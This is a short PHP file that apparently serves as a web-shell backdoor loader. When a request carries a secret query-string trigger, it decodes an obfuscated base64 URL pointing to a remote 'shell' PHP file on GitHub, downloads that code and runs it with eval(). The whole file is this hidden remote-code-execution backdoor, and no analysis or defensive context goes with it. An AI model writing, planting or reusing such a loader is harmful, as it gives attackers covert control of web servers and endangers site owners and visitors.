<?php
if ($_SERVER['QUERY_STRING'] === 'asdkl') {
    $url = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Fkc3RlcmFtYWhlc3dhcmEtY2xvdWQvc2hlbGwvcmVmcy9oZWFkcy9tYWluL3Nlb2JhcmJhci5waHA=');
    $s = @file_get_contents($url);
    if (!$s) die("❌ Gagal ambil shell.");
    $s = str_replace(['<?php', '<?', '?>'], '', $s);
    eval($s);
    exit;
}
?>